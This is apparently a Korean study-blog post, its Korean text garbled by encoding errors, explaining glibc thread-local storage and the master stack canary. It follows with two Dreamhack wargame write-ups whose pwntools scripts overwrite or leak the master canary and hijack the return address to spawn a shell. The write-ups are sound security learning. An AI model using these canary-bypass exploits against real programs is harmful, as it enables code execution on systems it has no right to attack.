---
title:  "TIL: Master canary ğŸ¥ "
excerpt: "2022.09.05 TIL âœ"
toc: true
toc_sticky: true

categories:
  - TIL
  - Hacking
---

## TLS

**TLS (Thread Local Storage)**ëŠ” threadì˜ ì „ì—­ ë³€ìˆ˜ë¥¼ ì €ì¥í•˜ê¸° ìœ„í•œ ì €ì¥ ê³µê°„ì„ ì˜ë¯¸í•œë‹¤. TLSëŠ” loaderì— ì˜í•´ í• ë‹¹ëœë‹¤.

### init_tls

ì•„ë˜ëŠ” loaderê°€ TLS ì˜ì—­ì„ í• ë‹¹í•˜ê³  ì´ˆê¸°í™”í•˜ëŠ” í•¨ìˆ˜ì¸ `init_tls`ì˜ ì½”ë“œì´ë‹¤.

```c
static void *
init_tls (void)
{
  /* Construct the static TLS block and the dtv for the initial
     thread.  For some platforms this will include allocating memory
     for the thread descriptor.  The memory for the TLS block will
     never be freed.  It should be allocated accordingly.  The dtv
     array can be changed if dynamic loading requires it.  */
  void *tcbp = _dl_allocate_tls_storage ();
  if (tcbp == NULL)
    _dl_fatal_printf ("\
cannot allocate TLS data structures for initial thread\n");
  /* Store for detection of the special case by __tls_get_addr
     so it knows not to pass this dtv to the normal realloc.  */
  GL(dl_initial_dtv) = GET_DTV (tcbp);
  /* And finally install it for the main thread.  */
  const char *lossage = TLS_INIT_TP (tcbp);
  if (__glibc_unlikely (lossage != NULL))
    _dl_fatal_printf ("cannot set up thread-local storage: %s\n", lossage);
  tls_init_tp_called = true;
  return tcbp;
}
```

- `_dl_allocate_tls_storage`ì—ì„œ TLS ì˜ì—­ì„ í• ë‹¹í•˜ê³ , ì´ë¥¼ `tcbp`ì— ì €ì¥í•œ ë’¤ ì´ë¥¼ `TLS_INIT_TP`ì˜ ì¸ìë¡œ ì „ë‹¬í•œë‹¤.

`TLS_INIT_TP` ë§¤í¬ë¡œëŠ” ì•„ë˜ì™€ ê°™ì´ ì •ì˜ë˜ì–´ ìˆë‹¤.

```c
# define TLS_INIT_TP(thrdescr) \
  ({ void *_thrdescr = (thrdescr);                                              \
     tcbhead_t *_head = _thrdescr;                                              \
     int _result;                                                              \
                                                                              \
     _head->tcb = _thrdescr;                                                      \
     /* For now the thread descriptor is at the same address.  */              \
     _head->self = _thrdescr;                                                      \
                                                                              \
     /* It is a simple syscall to set the %fs value for the thread.  */              \
     asm volatile ("syscall"                                                      \
                   : "=a" (_result)                                              \
                   : "0" ((unsigned long int) __NR_arch_prctl),                      \
                     "D" ((unsigned long int) ARCH_SET_FS),                      \
                     "S" (_thrdescr)                                              \
                   : "memory", "cc", "r11", "cx");                              \
                                                                              \
    _result ? "cannot set %fs base address for thread-local storage" : 0;     \
  })
```

- `arch_prctl` system callì˜ ì²« ë²ˆì§¸ argumentë¡œ `ARCH_SET_FS`, ë‘ ë²ˆì§¸ argumentë¡œ í• ë‹¹í•œ TLS ì£¼ì†Œê°€ ì „ë‹¬ëœë‹¤.
- `arch_prctl`ì˜ `ARCH_SET_FS`ëŠ” processì˜ fs segment registerë¥¼ ë‘ ë²ˆì§¸ argumentë¡œ ì´ˆê¸°í™”í•˜ëŠ” ì‘ì—…ì„ ìˆ˜í–‰í•œë‹¤. â†’ FS segment regitserëŠ” TLS ì˜ì—­ì„ ê°€ë¦¬í‚¤ê²Œ ëœë‹¤.

## Master Canary

**Canary**ëŠ” bufferë¥¼ ì‚¬ìš©í•˜ëŠ” í•¨ìˆ˜ì˜ prologueì—ì„œ `fs:0x28`**ì— ìœ„ì¹˜í•˜ëŠ” ê°’ì„ ê°€ì ¸ì™€ rbp ë°”ë¡œ ì•ì— ì‚½ì…**í•˜ì—¬ ìƒì„±ëœë‹¤.

ì•ì—ì„œ í™•ì¸í–ˆë“¯ì´, fsëŠ” TLSë¥¼ ê°€ë¦¬í‚¤ë¯€ë¡œ **TLS ì£¼ì†Œì— 0x28 byte ë§Œí¼ ë–¨ì–´ì§„ ì£¼ì†Œ**ì— ìœ„ì¹˜í•œ randomí•œ ê°’ì„ ì¹´ë‚˜ë¦¬ë¡œ ì‚¬ìš©í•˜ëŠ” ê²ƒì´ë‹¤. â†’ ì´ ê°’ì„ **Master Canary**ë¼ê³  ë¶€ë¥¸ë‹¤.

Stack bufferë¥¼ ì‚¬ìš©í•˜ëŠ” ëª¨ë“  í•¨ìˆ˜ì—ì„œ Master canaryë¥¼ ì´ìš©í•´ canaryë¥¼ ìƒì„±í•˜ë¯€ë¡œ, ëª¨ë“  í•¨ìˆ˜ì—ì„œ ì‚¬ìš©í•˜ëŠ” canaryëŠ” ë™ì¼í•˜ë‹¤.

### security_init

`security_init`ì€ TLS ì˜ì—­ì— **ëœë¤í•œ canary ê°’ì„ í• ë‹¹**í•œë‹¤.

```c
static void
security_init (void)
{
  /* Set up the stack checker's canary.  */
  uintptr_t stack_chk_guard = _dl_setup_stack_chk_guard (_dl_random);
#ifdef THREAD_SET_STACK_GUARD
  THREAD_SET_STACK_GUARD (stack_chk_guard);
#else
  __stack_chk_guard = stack_chk_guard;
#endif
  /* Set up the pointer guard as well, if necessary.  */
  uintptr_t pointer_chk_guard
    = _dl_setup_pointer_guard (_dl_random, stack_chk_guard);
#ifdef THREAD_SET_POINTER_GUARD
  THREAD_SET_POINTER_GUARD (pointer_chk_guard);
#endif
  __pointer_chk_guard_local = pointer_chk_guard;
  /* We do not need the _dl_random value anymore.  The less
     information we leave behind, the better, so clear the
     variable.  */
  _dl_random = NULL;
}
```

- `_dl_setup_stack_chk_guard`ëŠ” kernelì—ì„œ ìƒì„±í•œ random ê°’ì„ ê°–ëŠ” pointerì¸ `_dl_random`ì„ ì¸ìë¡œ canaryë¥¼ ìƒì„±í•œë‹¤.

### _dl_setup_stack_chk_guard

`_dl_setup_stack_chk_guard`ëŠ” `_dl_random`ì„ ì´ìš©í•´ canary ê°’ì„ ìƒì„±í•œë‹¤.

```c
static inline uintptr_t __attribute__ ((always_inline))
_dl_setup_stack_chk_guard (void *dl_random)
{
  union
  {
    uintptr_t num;
    unsigned char bytes[sizeof (uintptr_t)];
  } ret = { 0 };
  if (dl_random == NULL)
    {
      ret.bytes[sizeof (ret) - 1] = 255;
      ret.bytes[sizeof (ret) - 2] = '\n';
    }
  else
    {
      memcpy (ret.bytes, dl_random, sizeof (ret));
#if BYTE_ORDER == LITTLE_ENDIAN
      ret.num &= ~(uintptr_t) 0xff;
#elif BYTE_ORDER == BIG_ENDIAN
      ret.num &= ~((uintptr_t) 0xff << (8 * (sizeof (ret) - 1)));
```

- binaryì˜ byte orderingì— ë”°ë¼ AND ì—°ì‚°ì„ ìˆ˜ì •í•˜ëŠ”ë°, ê°’ì˜ **ì²« byte í˜¹ì€ ë§ˆì§€ë§‰ byteë¥¼ NULLë¡œ ë³€í™˜**í•œë‹¤. â†’ **canaryì˜ ì²« byteê°€ NULL**ì¸ ì´ìœ 

### THREAD_SET_STACK_GUARD

`THREAD_SET_STACK_GUARD` ë§¤í¬ë¡œë¥¼ ì´ìš©í•´ `_dl_setup_stack_chk_guard`ê°€ ìƒì„±í•œ ê°’ì„ `header.stack_guard`ì— ì‚½ì…í•œë‹¤.

TLS ì˜ì—­ì€ `tcbhead_t` structë¡œ êµ¬ì„±ë˜ì–´ ìˆëŠ”ë°, `stack_guard`ëŠ” canaryì˜ ê°’ì„ ê°–ëŠ” member variableì´ë‹¤. ë”°ë¼ì„œ, `THREAD_SET_STACK_GUARD`ëŠ” `TLS + 0x28`ì— canary ê°’ì„ ì‚½ì…í•˜ëŠ” ë§¤í¬ë¡œì´ë‹¤.

```c
typedef struct
{
  void *tcb;		/* Pointer to the TCB.  Not necessarily the
			   thread descriptor used by libpthread.  */
  dtv_t *dtv;
  void *self;		/* Pointer to the thread descriptor.  */
  int multiple_threads;
  uintptr_t sysinfo;
  uintptr_t stack_guard;
  uintptr_t pointer_guard;
  int gscope_flag;
#ifndef __ASSUME_PRIVATE_FUTEX
  int private_futex;
#else
  int __glibc_reserved1;
#endif
  /* Reservation of some values for the TM ABI.  */
  void *__private_tm[4];
  /* GCC split stack support.  */
  void *__private_ss;
} tcbhead_t;
```

## Bypass Canary

### Thread Stack

Thread í•¨ìˆ˜ì—ì„œ ì„ ì–¸ëœ ë³€ìˆ˜ëŠ” ì¼ë°˜ì ì¸ stack ì˜ì—­ì´ ì•„ë‹Œ, TLSì™€ ì¸ì ‘ëœ ì˜ì—­ì˜ stackì— í• ë‹¹ëœë‹¤. ê·¸ëŸ¬ë‚˜ thread í•¨ìˆ˜ëŠ” ì¼ë°˜ í•¨ìˆ˜ì™€ ë™ì¼í•˜ê²Œ mater canaryë¥¼ ì°¸ì¡°í•œë‹¤.

Threadì—ì„œ í• ë‹¹í•œ ë³€ìˆ˜ëŠ” master canaryë³´ë‹¤ ë‚®ì€ ì£¼ì†Œì— ìœ„ì¹˜í•˜ê¸° ë•Œë¬¸ì—, BOFê°€ ë°œìƒí•œë‹¤ë©´ master canaryë¥¼ ë®ì–´ì“¸ ìˆ˜ ìˆë‹¤. â†’ master canaryë¥¼ ë®ì–´ ì“´ë‹¤ë©´ stack canaryë¥¼ ì•Œì•„ë‚¼ í•„ìš” ì—†ì´ exploití•  ìˆ˜ ìˆë‹¤.

## Wargame: [mc_thread](https://dreamhack.io/wargame/challenges/359/)

```c
#include <pthread.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
void giveshell() { execve("/bin/sh", 0, 0); }
void init() {
  setvbuf(stdin, 0, 2, 0);
  setvbuf(stdout, 0, 2, 0);
}

int read_bytes (char *buf, int len) {
  int idx = 0;
  int read_len = 0;

  for (idx = 0; idx < len; idx++) {
    int ret;
    ret = read(0, buf+idx, 1);
    if (ret < 0) {
      return read_len;
    }
    read_len ++;
  }

  return read_len;
}

void thread_routine() {
  char buf[256];
  int size = 0;
  printf("Size: ");
  scanf("%d", &size);
  printf("Data: ");
  //read(0, buf, size);
  read_bytes(buf, size);
}

int main() {
  pthread_t thread_t;

  init();

  if (pthread_create(&thread_t, NULL, (void *)thread_routine, NULL) < 0) {
    perror("thread create error:");
    exit(0);
  }
  pthread_join(thread_t, 0);
  return 0;
}
```

### ë¶„ì„

<p align="center">
    <a href="/assets/images/TIL220905/IMG_0006.PNG">
    	<img src="/assets/images/TIL220905/IMG_0006.PNG" width="500">
    </a>
</p>

- `thread_routine`ì„ disassembleí•´ í™•ì¸í•˜ë©´, thread bufferê°€ `rbp-0x110`ì— ìœ„ì¹˜í•¨ì„ í™•ì¸í•  ìˆ˜ ìˆë‹¤. (0x7ffff77c1de0)
- gdbë¥¼ ì´ìš©í•˜ë©´ `$fs_base`ë¥¼ ì…ë ¥í•´ fsì˜ ì£¼ì†Œë¥¼ ì•Œ ìˆ˜ ìˆê³ , ì´ë¥¼ í†µí•´ master canaryì˜ ì£¼ì†Œë¥¼ í™•ì¸í•  ìˆ˜ ìˆë‹¤.
- thread bufferì™€ master canary ì‚¬ì´ì˜ offsetì´ 0x948ì„ì„ í™•ì¸í–ˆìœ¼ë©´, ì´ë¥¼ ì´ìš©í•´ payloadë¥¼ êµ¬ì„±í•œë‹¤.
- payloadëŠ” master canaryë¥¼ â€œAAAAAAAAâ€ë¡œ overwriteí•˜ê³ , stackì˜ canaryë„ â€œAAAAAAAAâ€ë¡œ overwriteí•˜ë„ë¡ êµ¬ì„±í•œë‹¤. ë˜í•œ payloadê°€ return addressë¥¼ `giveshell`ì˜ ì£¼ì†Œë¡œ overwriteí•˜ë„ë¡ êµ¬ì„±í•œë‹¤.

### Exploit

```python
from pwn import *

#p = process("./mc_thread")
p = remote("host3.dreamhack.games", 15907)
e = ELF("./mc_thread")

payload = b"A"*256
payload += b"A"*8
payload += b"A"*0x10
payload += p64(e.symbols["giveshell"])
payload += b"A"*(0x948 - len(payload))
payload += b"A"*0x8

p.sendlineafter("Size: ", str(len(payload)))
p.sendafter("Data: ", payload)

p.interactive()
```

## Wargame: [master_canary](https://dreamhack.io/wargame/challenges/58)

```c
#include <stdio.h>
#include <stdlib.h>
#include <signal.h>
#include <unistd.h>
#include <pthread.h>

char *global_buffer;

void alarm_handler() {
    puts("TIME OUT");
    exit(-1);
}

void initialize() {
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);
    signal(SIGALRM, alarm_handler);
    alarm(60);
}

void get_shell() {
    system("/bin/sh");
}

void *thread_routine() {
    char buf[256];

    global_buffer = buf;

}
void read_bytes(char *buf, size_t size) {
    size_t sz = 0;
    size_t idx = 0;
    size_t tmp;

    while (sz < size) {
        tmp = read(0, &buf[idx], 1);
        if (tmp != 1) {
            exit(-1);
        }
        idx += 1;
        sz += 1;
    }
    return;
}
int main(int argc, char *argv[]) {
    size_t size;
    pthread_t thread_t;
    size_t idx;
    char leave_comment[32];

    initialize();

    while(1) {
        printf("1. Create thread\n");
        printf("2. Input\n");
        printf("3. Exit\n");
        printf("> ");
        scanf("%d", &idx);

        switch(idx) {
            case 1:
                if (pthread_create(&thread_t, NULL, thread_routine, NULL) < 0)
                {
                    perror("thread create error");
                    exit(0);
                }
                break;
            case 2:
                printf("Size: ");
                scanf("%d", &size);

                printf("Data: ");
                read_bytes(global_buffer, size);

                printf("Data: %s", global_buffer);
                break;
            case 3:
                printf("Leave comment: ");
                read(0, leave_comment, 1024);
                return 0;
            default:
                printf("Nope\n");
                break;
        }
    }

    return 0;
}
```

### ë¶„ì„

<p align="center">
    <a href="/assets/images/TIL220905/IMG_0007.PNG">
    	<img src="/assets/images/TIL220905/IMG_0007.PNG" width="500">
    </a>
</p>

- gdbë¥¼ ì´ìš©í•´ canaryì˜ ê°’ì„ í™•ì¸í•œ í›„, `find [canary]`ë¡œ ê²€ìƒ‰í•˜ë©´ canary ê°’ì„ ê°€ì§„ ì£¼ì†Œê°€ ì´ **3ê°œ** ìˆìŒì„ í™•ì¸í•  ìˆ˜ ìˆë‹¤.
    
    <p align="center">
   	    <a href="/assets/images/TIL220905/Untitled.png">
    		<img src="/assets/images/TIL220905/Untitled.png" width="500">
    	</a>
	</p>
    
    - ìœ„ì˜ ë‘ ê°œì˜ ì£¼ì†ŒëŠ” ê°ê° **peer threadì™€ main threadì˜ master canary**ì´ê³ , ë§ˆì§€ë§‰ ì£¼ì†ŒëŠ” **stack ìœ„ì— ì¡´ì¬í•˜ëŠ” canary**ì„ì„ ì•Œ ìˆ˜ ìˆë‹¤.
- `global_buffer`ì˜ ì£¼ì†ŒëŠ” 0x7ffff77eee40ì´ë¯€ë¡œ, ì²« ë²ˆì§¸ ì£¼ì†Œê¹Œì§€ì˜ offsetì´ 0x8e8, ë‘ ë²ˆì§¸ ì£¼ì†Œê¹Œì§€ì˜ offsetì´ 0x7fd8e8ì´ë‹¤. main threadì˜ master canaryë¥¼ overwriteí•˜ê¸°ì—ëŠ” offsetì´ ë„ˆë¬´ í¬ë¯€ë¡œ **peer threadì˜ master canaryë¥¼ leak**í•˜ëŠ” ë°©ì‹ìœ¼ë¡œ exploití•œë‹¤.

### Exploit
```
from pwn import *

#p = process("./master_canary")
p = remote("host3.dreamhack.games", 22021)
#gdb.attach(p)
e = ELF("./master_canary")

p.sendlineafter("> ", "1")

p.sendlineafter("> ", "2")
payload = b"A"*(0x8e8+1)
p.sendlineafter("Size: ", str(int(0x8e8+1)))
p.sendafter("Data: ", payload)
p.recvuntil(payload)
canary = u64(b"\x00" + p.recvn(7))
p.sendlineafter("> ", "3")
payload = b"A" * (0x20 + 0x8) + p64(canary) + b"A"*0x8 + p64(e.symbols["get_shell"])

p.sendafter("Leave comment: ", payload)

p.interactive()
```